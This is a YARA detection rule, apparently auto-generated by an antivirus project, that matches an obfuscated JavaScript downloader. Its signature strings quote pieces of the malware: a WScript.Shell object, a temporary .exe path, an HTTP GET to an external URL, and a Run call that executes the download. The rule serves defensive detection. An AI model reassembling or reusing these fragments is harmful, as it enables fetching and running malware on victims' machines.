rule sig_20160328_ab4f6fae1187c4e9b8c4e50576995830 {
  meta:
    description = "datamaliciousorder - file 20160328_ab4f6fae1187c4e9b8c4e50576995830.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f06f15e39f68dc0e04e40bb2ffbf654960229d4559ad591f6efc022f5ea28623"

  strings:
    $s1  = "function Lfgzt() {return Vdtbb[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"pi1heiOy.exe\";};" fullword ascii
    $s2  = "do {WScript[Elnkf](Jzwsusqx() * 11)} while (Lvifq[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Lvifq[Lkmjc](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s4  = "var Vdtbb = function Uevbei() {return WScript[Elkcxigvd](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Payur(Lavlywd, Cavvtax){return Lavlywd - Cavvtax;};" fullword ascii
    $s6  = "function Uzgenvyafm(Ofkximkpuo){Vdtbb[\"Run\"](Ofkximkpuo, Tpzwt, Tpzwt);};" fullword ascii
    $s7  = "Xmrnxtkxgh = true; " fullword ascii
    $s8  = "function Dfegx()" fullword ascii
    $s9  = "var Rxuxtjhfl = false;" fullword ascii
    $s10 = "function Dywvewkcga(){return Lapasebol;};" fullword ascii
    $s11 = "function Ilvbnfuqw(){return Elkcxigvd;};" fullword ascii
    $s12 = "function Jzwsusqx(){return 22;};" fullword ascii
    $s13 = "function Pttshyucb(Tpwzyp) {var Zystxvsgw = (1, 2, 3, 4, 5, Tpwzyp); return Zystxvsgw;};" fullword ascii
    $s14 = "var Xmrnxtkxgh = false;" fullword ascii
    $s15 = "var Vkxyjidbnp = false;" fullword ascii
    $s16 = "var Jxlbtaxfo = new this[\"Date\"]();" fullword ascii
    $s17 = "Rxuxtjhfl = true; " fullword ascii
    $s18 = "return Payur(Mjzqzah, Qrsbahxqzn);" fullword ascii
    $s19 = " while (Vcoliyx){" fullword ascii
    $s20 = "function Eehcajfri() {return ((Xmrnxtkxgh == true) && (Xmrnxtkxgh == Rxuxtjhfl)) ? 1 : Tpzwt;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}